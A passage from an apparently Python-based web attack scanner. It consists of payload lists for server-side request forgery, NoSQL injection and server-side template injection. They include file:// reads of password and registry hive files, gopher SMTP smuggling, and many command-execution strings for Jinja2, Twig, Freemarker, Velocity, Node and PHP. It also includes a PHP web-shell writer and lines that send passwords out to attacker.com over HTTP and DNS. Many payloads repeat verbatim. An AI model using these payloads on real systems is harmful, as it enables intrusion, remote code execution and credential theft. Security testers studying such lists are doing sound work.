            "file:///etc/hosts",
            "file:///etc/group",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/version",
            "file:///proc/mounts",
            "file:///proc/net/tcp",
            "file:///proc/net/udp",
            

            "file:///C:/windows/win.ini",
            "file:///C:/windows/system.ini",
            "file:///C:/boot.ini",
            "file:///C:/windows/System32/config/SAM",
            "file:///C:/windows/System32/config/SYSTEM",
            "file:///C:/windows/System32/config/SECURITY",
            "file:///C:/windows/System32/config/SOFTWARE",
            "file:///C:/windows/System32/config/DEFAULT",
            "file:///C:/windows/repair/SAM",
            "file:///C:/windows/repair/SYSTEM",
            

            "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM%3A%3Cattacker%40example.com%3E%0ARCPT%20TO%3A%3Cvictim%40example.com%3E%0ADATA%0AFrom%3A%20attacker%40example.com%0ATo%3A%20victim%40example.com%0ASubject%3A%20Test%0A%0ATest%0A.%0AQUIT%0A",
            "gopher://127.0.0.1:3306/_",
            "gopher://127.0.0.1:6379/_",
            "gopher://127.0.0.1:11211/_",
            "gopher://127.0.0.1:27017/_",
            "gopher://127.0.0.1:9200/_",
            "gopher://127.0.0.1:5984/_",
            "gopher://127.0.0.1:5432/_",
            "gopher://127.0.0.1:1433/_",
            "gopher://127.0.0.1:1521/_",
            "gopher://127.0.0.1:389/_",
            

            "dict://127.0.0.1:11211/stat",
            "dict://127.0.0.1:6379/info",
            "dict://127.0.0.1:27017/ismaster",
            "dict://127.0.0.1:9200/",
            "dict://127.0.0.1:5984/",
            "dict://127.0.0.1:5432/",
            "dict://127.0.0.1:1433/",
            "dict://127.0.0.1:1521/",
            "dict://127.0.0.1:3306/",
            "dict://127.0.0.1:80/",
            

            "ldap://127.0.0.1",
            "ldap://127.0.0.1:389",
            "ldap://127.0.0.1:636",
            "ldaps://127.0.0.1",
            "ldaps://127.0.0.1:389",
            "ldaps://127.0.0.1:636",
            "ldap://localhost",
            "ldap://localhost:389",
            "ldap://localhost:636",
            "ldaps://localhost",
            

            "ftp://anonymous:anonymous@127.0.0.1",
            "ftp://anonymous:anonymous@127.0.0.1:21",
            "ftp://anonymous:anonymous@localhost",
            "ftp://anonymous:anonymous@localhost:21",
            "ftp://user:pass@127.0.0.1",
            "ftp://user:pass@127.0.0.1:21",
            "ftp://user:pass@localhost",
            "ftp://user:pass@localhost:21",
            

            "ssh://root@127.0.0.1",
            "ssh://root@127.0.0.1:22",
            "ssh://root@localhost",
            "ssh://root@localhost:22",
            "ssh://admin@127.0.0.1",
            "ssh://admin@127.0.0.1:22",
            "ssh://admin@localhost",
            "ssh://admin@localhost:22",
            

            "mysql://root:password@127.0.0.1:3306/test",
            "mysql://root:password@localhost:3306/test",
            "postgresql://postgres:password@127.0.0.1:5432/postgres",
            "postgresql://postgres:password@localhost:5432/postgres",
            "mongodb://127.0.0.1:27017/test",
            "mongodb://localhost:27017/test",
            "redis://127.0.0.1:6379",
            "redis://localhost:6379",
            

            "http://127.0.0.1:27017/test",
            "http://localhost:27017/test",
            "http://127.0.0.1:28017/",
            "http://localhost:28017/",
            "http://127.0.0.1:9200/",
            "http://localhost:9200/",
            "http://127.0.0.1:5984/",
            "http://localhost:5984/",
            

            "http://127.0.0.1:11211/",
            "http://localhost:11211/",
            "http://127.0.0.1:11211/stat",
            "http://localhost:11211/stat",
            "http://127.0.0.1:11211/version",
            "http://localhost:11211/version",
            

            "http://127.0.0.1:5672/",
            "http://localhost:5672/",
            "http://127.0.0.1:61613/",
            "http://localhost:61613/",
            "http://127.0.0.1:1883/",
            "http://localhost:1883/",
            

            "http://127.0.0.1:2375/version",
            "http://localhost:2375/version",
            "http://127.0.0.1:2376/version",
            "http://localhost:2376/version",
            "https://127.0.0.1:6443/api/v1/pods",
            "https://localhost:6443/api/v1/pods",
            "http://127.0.0.1:10250/pods",
            "http://localhost:10250/pods",
            

            "http://127.0.0.1:8500/v1/catalog/services",
            "http://localhost:8500/v1/catalog/services",
            "http://127.0.0.1:8500/v1/agent/services",
            "http://localhost:8500/v1/agent/services",
            "http://127.0.0.1:8500/v1/kv/?keys",
            "http://localhost:8500/v1/kv/?keys",
            

            "http://127.0.0.1:8500/v1/kv/",
            "http://localhost:8500/v1/kv/",
            "http://127.0.0.1:8500/v1/health/service/",
            "http://localhost:8500/v1/health/service/",
            

            "http://127.0.0.1:9090/api/v1/query?query=up",
            "http://localhost:9090/api/v1/query?query=up",
            "http://127.0.0.1:9090/api/v1/targets",
            "http://localhost:9090/api/v1/targets",
            "http://127.0.0.1:9090/api/v1/rules",
            "http://localhost:9090/api/v1/rules",
            "http://127.0.0.1:9090/api/v1/alerts",
            "http://localhost:9090/api/v1/alerts",
            

            "http://127.0.0.1:5601/",
            "http://localhost:5601/",
            "http://127.0.0.1:9200/_cat/indices",
            "http://localhost:9200/_cat/indices",
            "http://127.0.0.1:9200/_search",
            "http://localhost:9200/_search",
            

            "http://127.0.0.1:16686/",
            "http://localhost:16686/",
            "http://127.0.0.1:9411/",
            "http://localhost:9411/",
            

            "http://127.0.0.1:8080/",
            "http://localhost:8080/",
            "http://127.0.0.1:8000/",
            "http://localhost:8000/",
            "http://127.0.0.1:3000/",
            "http://localhost:3000/",
            "http://127.0.0.1:9000/",
            "http://localhost:9000/",
            "http://127.0.0.1:15672/",
            "http://localhost:15672/",
            

            "http://127.0.0.1:9001/",
            "http://localhost:9001/",
            "http://127.0.0.1:9990/",
            "http://localhost:9990/",
            "http://127.0.0.1:9999/",
            "http://localhost:9999/",
            "http://127.0.0.1:10000/",
            "http://localhost:10000/",
            "http://127.0.0.1:10001/",
            "http://localhost:10001/",
            

            "http://127.0.0.1:35729/",
            "http://localhost:35729/",
            "http://127.0.0.1:4200/",
            "http://localhost:4200/",
            "http://127.0.0.1:49152/",
            "http://localhost:49152/",
            "http://127.0.0.1:8001/",
            "http://localhost:8001/",
            "http://127.0.0.1:8002/",
            "http://localhost:8002/",
            

            "http://127.0.0.1:81",
            "http://localhost:81",
            "http://127.0.0.1:82",
            "http://localhost:82",
            "http://127.0.0.1:83",
            "http://localhost:83",
            "http://127.0.0.1:84",
            "http://localhost:84",
            "http://127.0.0.1:85",
            "http://localhost:85",
            

            "http://127.0.0.1:8081",
            "http://localhost:8081",
            "http://127.0.0.1:8082",
            "http://localhost:8082",
            "http://127.0.0.1:8083",
            "http://localhost:8083",
            "http://127.0.0.1:8084",
            "http://localhost:8084",
            "http://127.0.0.1:8085",
            "http://localhost:8085",
            

            "https://127.0.0.1:8443",
            "https://localhost:8443",
            "https://127.0.0.1:8444",
            "https://localhost:8444",
            "https://127.0.0.1:8445",
            "https://localhost:8445",
            "https://127.0.0.1:8446",
            "https://localhost:8446",
            "https://127.0.0.1:8447",
            "https://localhost:8447",
            

            "http://127.0.0.1:8888",
            "http://localhost:8888",
            "http://127.0.0.1:8889",
            "http://localhost:8889",
            "http://127.0.0.1:8890",
            "http://localhost:8890",
            "http://127.0.0.1:8891",
            "http://localhost:8891",
            "http://127.0.0.1:8892",
            "http://localhost:8892",
            

            "http://127.0.0.1:9001",
            "http://localhost:9001",
            "http://127.0.0.1:9002",
            "http://localhost:9002",
            "http://127.0.0.1:9003",
            "http://localhost:9003",
            "http://127.0.0.1:9004",
            "http://localhost:9004",
            "http://127.0.0.1:9005",
            "http://localhost:9005",
            

            "http://127.0.0.1:8080/swagger-ui.html",
            "http://localhost:8080/swagger-ui.html",
            "http://127.0.0.1:8080/api-docs",
            "http://localhost:8080/api-docs",
            "http://127.0.0.1:8080/apidoc",
            "http://localhost:8080/apidoc",
            "http://127.0.0.1:8080/docs",
            "http://localhost:8080/docs",
            "http://127.0.0.1:8080/documentation",
            "http://localhost:8080/documentation",
            

            "http://127.0.0.1:8080/health",
            "http://localhost:8080/health",
            "http://127.0.0.1:8080/actuator/health",
            "http://localhost:8080/actuator/health",
            "http://127.0.0.1:8080/status",
            "http://localhost:8080/status",
            "http://127.0.0.1:8080/ping",
            "http://localhost:8080/ping",
            "http://127.0.0.1:8080/ready",
            "http://localhost:8080/ready",
            

            "http://127.0.0.1:8080/metrics",
            "http://localhost:8080/metrics",
            "http://127.0.0.1:8080/actuator/metrics",
            "http://localhost:8080/actuator/metrics",
            "http://127.0.0.1:8080/prometheus/metrics",
            "http://localhost:8080/prometheus/metrics",
            "http://127.0.0.1:8080/statistics",
            "http://localhost:8080/statistics",
            "http://127.0.0.1:8080/stats",
            "http://localhost:8080/stats",
            

            "http://127.0.0.1:8080/debug",
            "http://localhost:8080/debug",
            "http://127.0.0.1:8080/actuator",
            "http://localhost:8080/actuator",
            "http://127.0.0.1:8080/trace",
            "http://localhost:8080/trace",
            "http://127.0.0.1:8080/dump",
            "http://localhost:8080/dump",
            "http://127.0.0.1:8080/info",
            "http://localhost:8080/info",
            

            "http://127.0.0.1:8080/config",
            "http://localhost:8080/config",
            "http://127.0.0.1:8080/configuration",
            "http://localhost:8080/configuration",
            "http://127.0.0.1:8080/settings",
            "http://localhost:8080/settings",
            "http://127.0.0.1:8080/properties",
            "http://localhost:8080/properties",
            "http://127.0.0.1:8080/env",
            "http://localhost:8080/env",
            

            "http://127.0.0.1:8080/admin",
            "http://localhost:8080/admin",
            "http://127.0.0.1:8080/administrator",
            "http://localhost:8080/administrator",
            "http://127.0.0.1:8080/manager",
            "http://localhost:8080/manager",
            "http://127.0.0.1:8080/console",
            "http://localhost:8080/console",
            "http://127.0.0.1:8080/panel",
            "http://localhost:8080/panel",
            

            "http://127.0.0.1:8080/phpmyadmin",
            "http://localhost:8080/phpmyadmin",
            "http://127.0.0.1:8080/adminer",
            "http://localhost:8080/adminer",
            "http://127.0.0.1:8080/pgadmin",
            "http://localhost:8080/pgadmin",
            "http://127.0.0.1:8080/redis-admin",
            "http://localhost:8080/redis-admin",
            "http://127.0.0.1:8080/mongoadmin",
            "http://localhost:8080/mongoadmin",
            

            "http://127.0.0.1:8080/files",
            "http://localhost:8080/files",
            "http://127.0.0.1:8080/filemanager",
            "http://localhost:8080/filemanager",
            "http://127.0.0.1:8080/uploads",
            "http://localhost:8080/uploads",
            "http://127.0.0.1:8080/downloads",
            "http://localhost:8080/downloads",
            "http://127.0.0.1:8080/static",
            "http://localhost:8080/static",
            

            "http://127.0.0.1:8080/api",
            "http://localhost:8080/api",
            "http://127.0.0.1:8080/api/v1",
            "http://localhost:8080/api/v1",
            "http://127.0.0.1:8080/api/v2",
            "http://localhost:8080/api/v2",
            "http://127.0.0.1:8080/rest",
            "http://localhost:8080/rest",
            "http://127.0.0.1:8080/rest/api",
            "http://localhost:8080/rest/api",
            

            "http://127.0.0.1:8080/graphql",
            "http://localhost:8080/graphql"
        ]
        
        self.nosql_payloads = [

            '{"$where": "1 == 1"}',
            '{"$where": "sleep(5000)"}',
            '{"$where": "this.username == \'admin\'"}',
            '{"$where": "return true"}',
            '{"$where": "1"}',
            

            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$ne": "test"}',
            '{"$gt": ""}',
            '{"$gt": 0}',
            '{"$gt": "A"}',
            '{"$lt": "ZZZZZZZZ"}',
            '{"$gte": 0}',
            '{"$lte": 999999}',
            '{"$exists": true}',
            '{"$exists": false}',
            

            '{"$regex": ".*"}',
            '{"$regex": "^.*$"}',
            '{"$regex": "^admin$"}',
            '{"$regex": "a"}',
            '{"$regex": ".*", "$options": "i"}',
            '{"$regex": "\\w*"}',
            '{"$regex": "\\\\w*"}',
            

            '{"$or": [{"username": "admin"}, {"password": "test"}]}',
            '{"$or": [{"username": "admin"}, {"1": "1"}]}',
            '{"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
            '{"$nor": [{"username": "test"}, {"password": "test"}]}',
            '{"$not": {"username": "test"}}',
            

            '{"$in": ["admin"]}',
            '{"$in": ["admin", "test"]}',
            '{"$nin": ["admin", "test"]}',
            '{"$all": ["admin"]}',
            '{"$elemMatch": {"username": "admin"}}',
            '{"$size": 1}',
            

            '{"$function": {"body": "function() { return true; }"}}',
            '{"$expr": {"$eq": ["$username", "admin"]}}',
            '{"$expr": {"$eq": [1, 1]}}',
            '{"$expr": {"$eq": ["$username", {"$toLower": "$username"}]}}',
            

            '{"$text": {"$search": "\"admin\""}}',
            '{"$text": {"$search": "test", "$language": "none"}}',
            

            '{"$near": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}',
            '{"$geoWithin": {"$geometry": {"type": "Polygon", "coordinates": [[[0,0], [1,1], [0,1], [0,0]]]}}}',
            

            '{"$type": "string"}',
            '{"$type": 2}',
            '{"$type": 16}',
            

            '{"$mod": [10, 0]}',
            '{"$mod": [2, 1]}',
            '{"$regexMatch": {"input": "$username", "regex": "admin"}}',
            

            '{"username": "admin", "$comment": "Injected comment"}',
            

            '{"$slice": 1}',
            '{"$elemMatch": {"$gt": 0}}',
            

            '[{"$match": {"username": "admin"}}, {"$project": {"password": 1}}]',
            '[{"$match": {"$where": "1==1"}}]',
            

            '{"$binary": {"base64": "QUJD", "subType": "00"}}',
            '{"$timestamp": {"t": 1, "i": 1}}',
            '{"$minKey": 1}',
            '{"$maxKey": 1}',
            

            'admin\' || \'1\'==\'1',
            'admin\' || \'1\'==\'1\' || \'',
            'admin" || "1"=="1',
            'admin" || "1"=="1" || "',
            '\' || \'a\'==\'a',
            '" || "a"=="a',
            

            'admin\\x00',
            'admin\\0',
            'admin%00',
            

            '{"username": "admin"/*", "password": "*/}',
            '{"username": "admin"//", "password": ""}',
            

            '{"username": "admin"}, {"$set": {"role": "admin"}}',
            '{"username": "admin"}; {"$set": {"role": "admin"}}',
            

            '{"username.$gt": ""}',
            '{"username.$regex": ".*"}',
            '{"$where": "this.username[0] == \'a\'"}',
            

            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            

            '{"$where": "sleep(5000)"}',
            '{"$where": "Date.now() > 0"}',
            '{"$where": "new Date().getTime() > 0"}',
            

            '{"$where": "throw new Error(\'Injection\')"}',
            '{"$where": "undefinedVariable"}',
            

            '{"$where": "process.version"}',
            '{"$where": "require(\'child_process\').execSync(\'id\').toString()"}',
            '{"$where": "this.constructor.constructor(\'return process.env\')()"}',
            

            'Map {"username" => "admin"}',
            '{"username": Map {"$gt" => ""}}',
            

            '{"selector": {"username": {"$eq": "admin"}}}',
            '{"selector": {"$or": [{"username": "admin"}, {"password": "test"}]}}',
            

            '\' OR \'1\'=\'1',
            '\' ALLOW FILTERING',
            '\'; SELECT * FROM system_schema.keyspaces',
            

            '{"username": {"ComparisonOperator": "EQ", "AttributeValueList": [{"S": "admin"}]}}',
            '{"username": {"EQ": "admin"}}',
            

            '\' OR 1==1 RETURN u',
            '\' FILTER u.username == \'admin\' RETURN u',
            

            '\' OR 1=1',
            '\' SELECT * FROM c',
            

            'GET *',
            'KEYS *',
            'SCAN 0 MATCH *',
            

            '{"query": {"match_all": {}}}',
            '{"query": {"bool": {"must": [{"match": {"username": "admin"}}]}}}',
            '{"query": {"script": {"script": "1 == 1"}}}',
            

            'r.row(\'username\').eq(\'admin\')',
            'r.expr(1).eq(1)',
            

            '\' OR 1=1',
            '\' |> filter(fn: (r) => true)',
            

            '\' OR 1=1;',
            '\'; SELECT * FROM hypertables',
            

            '\' OR 1=1 RETURN n',
            '\' MATCH (n) RETURN n',
            

            'g.V().has(\'username\', \'admin\')',
            'g.V().hasLabel(\'user\')',
            

            '\' OR 1=1',
            '\' SELECT FROM OUser',
            

            '\' OR 1=1',
            '\' return /user[username="admin"]',
            

            '\' OR 1=1',
            '\' SELECT * FROM `bucket`',
            

            '\' OR 1=1',
            '\' FROM Users',
            

            'q.Equals(1, 1)',
            'q.Get(q.Match(q.Index("all_users")))',
            

            '\' OR 1=1',
            '\'&select=*',
            '\'&id=eq.1&or=(id.eq.1,id.eq.2)',
            

            '{"where": {"_or": [{"username": {"_eq": "admin"}}, {"password": {"_eq": "test"}}]}}',
            '{"where": {"username": {"_ilike": "%"}}}',
            

            '{"where": {"OR": [{"username": "admin"}, {"password": "test"}]}}',
            '{"where": {"username": {"contains": "a"}}}',
            

            '{"where": {"[Op.or]": [{"username": "admin"}, {"password": "test"}]}}',
            '{"where": {"username": {"[Op.like]": "%"}}}',
            

            '{"where": "username = :username OR 1=1", "parameters": {"username": "admin"}}',
            '{"where": "username LIKE \'%\'"}',
            

            '{"$where": "this.username == req.body.username"}',
            '{"username": {"$regex": req.body.username}}',
            

            '{"or": [{"username": "admin"}, {"password": "test"}]}',
            '{"username": {"contains": "a"}}',
            

            '{"where": function() { return this.where("username", "admin").orWhere("1", "1"); }}',
            

            '{"where": function(builder) { return builder.where("username", "admin").orWhereRaw("1=1"); }}',
            

            '{"$or": [{"username": "admin"}, {"password": "test"}]}',
            '{"username": {"$like": "%"}}',
            

            '{"username": {"$gt": ""}, "$comment": "Injected"}',
            '{"$and": [{"username": {"$ne": null}}, {"$where": "1"}]}',
            '{"username": "admin", "$**": {"$gt": ""}}',
            '{"$natural": {"$gt": -1}}',
            '{"$comment": {"$function": "function() { return true; }"}}',
            '{"$js": "function() { return true; }"}',
            '{"$bson": "AQAAAAJ1c2VybmFtZQAGAAAABmFkbWluAA=="}',
            '{"$timestamp": 0}',
            '{"$undefined": true}',
            '{"$symbol": "test"}',
            '{"$dbPointer": {"$ref": "users", "$id": {"$oid": "000000000000000000000000"}}}',
            '{"$code": "function() { return true; }"}',
            '{"$codeWScope": {"code": "function() { return true; }", "scope": {}}}',
            

            '{"$where": "for(var i=0;i<1000000;i++) {}"}',
            '{"$regex": "^(.*)*$"}',
            '{"$regex": "(a+)+$"}',
            '{"$regex": "(a|aa)+$"}',
            '{"$where": "Array(1000000).join(\'a\')"}',
            

            '{"$where": "require(\'child_process\').exec(\'touch /tmp/pwned\')"}',
            '{"$where": "global.process.mainModule.require(\'child_process\').execSync(\'id\')"}',
            '{"$function": {"body": "function() { return global.process.mainModule.require(\'child_process\').execSync(\'id\').toString(); }"}}',
            

            '{"$eval": "process.exit()"}',
            '{"$eval": "while(1){}"}',
            '{"$eval": "new Date().toUTCString()"}',
            

            '{"$where": "this.constructor.constructor(\'return this\')().fetch(\'http://attacker.com/?leak=\'+this.password)"}',
            '{"$function": {"body": "function() { require(\'http\').get(\'http://attacker.com/?leak=\'+this.password); return true; }"}}',
            

            '{"$where": "sleep(this.username == \\\'admin\\\' ? 5000 : 0)"}',
            '{"$where": "if(this.username == \\\'admin\\\') { sleep(5000); }"}',
            '{"$expr": {"$cond": [{"$eq": ["$username", "admin"]}, {"$function": {"body": "function() { sleep(5000); return true; }"}}, true]}}',
            

            '{"$where": "this.constructor.constructor(\'return this\')().require(\'dns\').lookup(\'leak.\'+this.password+\'.attacker.com\')"}',
            '{"$function": {"body": "function() { require(\'dns\').resolve(\'leak.\'+this.password+\'.attacker.com\'); return true; }"}}',
        ]
        
        self.ssti_payloads = [

            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "{{7*'7'}}",
            "{{7*7}}",
            "{{7*7}}",
            "{{7*7}}",
            "{{7*7}}",
            

            "{{config}}",
            "{{request}}",
            "{{self}}",
            "{{url_for.__globals__}}",
            "{{get_flashed_messages.__globals__}}",
            "{{lipsum.__globals__}}",
            "{{cycler.__globals__}}",
            "{{joiner.__globals__}}",
            "{{namespace.__globals__}}",
            
            "{{''.__class__}}",
            "{{().__class__}}",
            "{{[].__class__}}",
            "{{request.__class__}}",
            "{{config.__class__}}",
            
            "{{''.__class__.__mro__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[400]}}",
            
            "{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[256].__init__.__globals__['os'].popen('ls').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[258].__init__.__globals__['os'].listdir('.')}}",
            
            "{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
            "{{request.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['os'].popen('id').read()}}",
            

            "{{lipsum.__globals__.os.popen('id').read()}}",
            "{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
            
            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].popen('id').read()}}",
            
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{self.__dict__._TemplateReference__context.config}}",
            

            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
            "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"whoami\")}}",
            "{{app.request.server.all|join(',')}}",
            "{{app.request.query.filter(0,'incorrect','<?php system(\"id\"); ?>')}}",
            
            "{{['id']|filter('system')}}",
            "{{['cat /etc/passwd']|filter('system')}}",
            "{{['phpinfo']|filter('system')}}",
            
            "{{_self.env.setCache('ftp://attacker.net:2121')}}{{_self.env.loadTemplate('backdoor')}}",
            "{{app.request.query.get(1)}}",
            "{{app.request.query.all}}",
            

            "{php}echo `id`;{/php}",
            "{if phpinfo()}{/if}",
            "{system('id')}",
            "{readfile('/etc/passwd')}",
            
            "{Smarty_Internal_Write_File::writeFile('shell.php','<?php system($_GET[\"cmd\"]); ?>',self::clearConfig())}",
            "{$smarty.version}",
            "{$smarty.template_object}",
            

            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "<#assign ex=freemarker.template.utility.ObjectConstructor?new(\"java.lang.ProcessBuilder\",[\"id\"]).start()>",
            "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"id\")</@value>",
            
            "${productClass?new()}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").getRuntime().exec(\"id\")}",
            
            "<#assign loader=\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.net.URLClassLoader\")>",
            "<#assign clazz=loader.loadClass(\"freemarker.template.utility.Execute\")>",
            "<#assign ex=clazz.newInstance()>${ex(\"id\")}",
            

            "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))#set($chr=$x.class.forName(\"java.lang.Character\"))#set($str=$x.class.forName(\"java.lang.String\"))#set($ex=$rt.getRuntime().exec(\"id\"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            
            "#set($exec=\"stuff\")#set($str=$x.class.forName(\"java.lang.String\"))#set($chr=$x.class.forName(\"java.lang.Character\"))#set($ex=$rt.exec(\"id\"))",
            "#set($e=\"exp\")#set($exp=\"e\")#set($x=$x.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec($cmd))",
            

            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${#ctx.getVariable('param')}",
            "${#request.getParameter('param')}",
            "${#httpServletRequest.getParameter('param')}",
            "${#strings.substring('Hello', 0, 1)}",
            
            "${#strings.getClass().getClassLoader().getParent().loadClass('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\\\"id\\\")')}",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}",
            

            "{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return global.process.mainModule.require('child_process').execSync('id');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}",
            
            "{{#with \"e\" as |string|}} {{#with split as |array|}} {{array.length}} {{/with}} {{/with}}",
            "{{lookup this \"constructor\"}}",
            

            "<% import os; x=os.popen(\"id\").read(); %>${x}",
            "${__import__('os').popen('id').read()}",
            "<%! import os %>${os.popen('whoami').read()}",
            

            "<%= system('id') %>",
            "<%= `id` %>",
            "<%= IO.popen('id').readlines %>",
            "<%= File.open('/etc/passwd').read %>",
            "<%= Dir.entries('.') %>",
            "<%= require 'open3'; Open3.capture2('id') %>",
            "<%= eval(params[:cmd]) %>",
            
            "<%= 7*7 %>",
            "<%= 7*'7' %>",
            "<%= 'id'.class %>",
            "<%= ''.class.class %>",
            

            "@(1+2)",
            "@{ // C# code }",
            "@System.Diagnostics.Process.Start(\"cmd.exe\")",
            "@Response.Write(\"test\")",
            

            "{{ 'id'|system }}",
            "{{ 'test'.class }}",
            "{{ 'test'.getClass() }}",
            

            "{% debug %}",
            "{% load debug %}{% debug %}",
            "{{ settings.SECRET_KEY }}",
            "{{ request }}",
            "{{ request.user }}",
            "{{ request.GET.urlencode }}",
            
            "{% with value=settings.SECRET_KEY %}{{ value }}{% endwith %}",
            "{% include \"debug.html\" %}",
            "{% extends \"debug.html\" %}",
            

            "{{ g }}",
            "{{ session }}",
            "{{ url_for.__globals__['current_app'].config }}",
            "{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read() }}",
            

            "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
            "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('calc.exe')}",
            "${#this.getClass().getClassLoader().getParent().newInstance('javax.script.ScriptEngineManager').getEngineByName('JavaScript').eval(\"java.lang.Runtime.getRuntime().exec('calc.exe')\")}",
            

            "#{facesContext.getExternalContext().getRequest()}",
            "#{facesContext.externalContext.request}",
            "#{param.test}",
            "#{sessionScope.test}",
            

            "{{$eval.constructor('alert(1)')()}}",
            "{{constructor.constructor('alert(1)')()}}",
            "{{a='constructor';b=a;c={};a=c[b];d=a('alert(1)');d()}}",
            "{{$on.constructor('alert(1)')()}}",
            

            "{{_c.constructor('alert(1)')()}}",
            "{{$data.constructor.constructor('alert(1)')()}}",
            

            "{alert(1)}",
            "{this.props.children}",
            "{console.log(this)}",
            

            "= global.process.mainModule.require('child_process').execSync('id')",
            "#{global.process.mainModule.require('child_process').execSync('id')}",
            "- var x = global.process.mainModule.require('child_process')",
            

            "<%- global.process.mainModule.require('child_process').execSync('id') %>",
            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
            "<%# comment %>",
            

            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
            "{{this.constructor(\"return global.process.mainModule.require('child_process')\")()}}",
            

            "{{#with \"string\"}} {{../this.pop}} {{/with}}",
            "{{^}}{{/^}}",
            

            "{{{#with}}{{/with}}}",
            "{{> partial}}",
            

            "<%= _.templateSettings.evaluate = /<%([\s\S]+?)%>/g; %>",
            "<%= _.templateSettings.interpolate = /<%=([\s\S]+?)%>/g; %>",
            

            "$ console.log(global.process.mainModule.require('child_process').execSync('id'))",
            

            "${global.process && global.process.mainModule.require('child_process').execSync('id')}",
            

            "<!-- ko text: global.process.mainModule.require('child_process').execSync('id') --><!-- /ko -->",
            

            "{{unbound global.process.mainModule.require('child_process').execSync('id')}}",
            

            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
            

            "[[global.process.mainModule.require('child_process').execSync('id')]]",
            "{{global.process.mainModule.require('child_process').execSync('id')}}",
            

            "{@html global.process.mainModule.require('child_process').execSync('id')}",
            

            "x-text=\"global.process.mainModule.require('child_process').execSync('id')\"",
            

            "${global.process.mainModule.require('child_process').execSync('id')}",
            

            "{global.process.mainModule.require('child_process').execSync('id')}",
            

            "{global.process.mainModule.require('child_process').execSync('id')}",
            

            "{{ $fetch(global.process.mainModule.require('child_process').execSync('id')) }}",
            

            "{global.process.mainModule.require('child_process').execSync('id')}",
            

            "{{ $static(global.process.mainModule.require('child_process').execSync('id')) }}",
            

            "{{ global.process.mainModule.require('child_process').execSync('id') }}",
            

            "{{ `id` | sh }}",
            "{{ readFile \"/etc/passwd\" }}",
            

            "{% raw %} {{ 7*7 }} {% endraw %}",
            "{% highlight ruby %} puts `id` {% endhighlight %}",
            

            "<%- global.process.mainModule.require('child_process').execSync('id') %>",
            

            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
            

            "{{ global.process.mainModule.require('child_process').execSync('id') }}",
            

            "{{ global.process.mainModule.require('child_process').execSync('id') }}",
            

            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
            

            "{{ global.process.mainModule.require('child_process').execSync('id') }}",
            

            "<%= `id` %>",
            

            "{{ global.process.mainModule.require('child_process').execSync('id') }}",
            

            "<?php system('id'); ?>",
            "{{ php system('id'); }}",
            

            "{{ global.process.mainModule.require('child_process').execSync('id') }}",
            

            "{{ craft.app.config.general }}",
            "{{ craft.app.request }}",
            

            "{exp:query sql=\"SELECT * FROM exp_members\"}",
            

            "{{ php }} phpinfo(); {{ /php }}",
            "[php] phpinfo(); [/php]",
            

            "<?php echo `id`; ?>",
            "<?php system($_GET['cmd']); ?>",
            "{{php}} echo `id`; {{/php}}",
            

            "<?php echo `id`; ?>",
            "{source}<?php echo `id`; ?>{/source}",
            

            "<?php echo `id`; ?>",
            "<?php exec('id'); ?>",
            

            "{{block type='core/template' template='../../../../../../etc/passwd'}}",
            "{{block class='Mage_Core_Block_Template' template='../../../../../../etc/passwd'}}",
            

            "{$smarty.now|date_format:\"%Y-%m-%d %H:%M:%S\"}",
            "{config_load file=\"../../../../../../etc/passwd\"}",
            

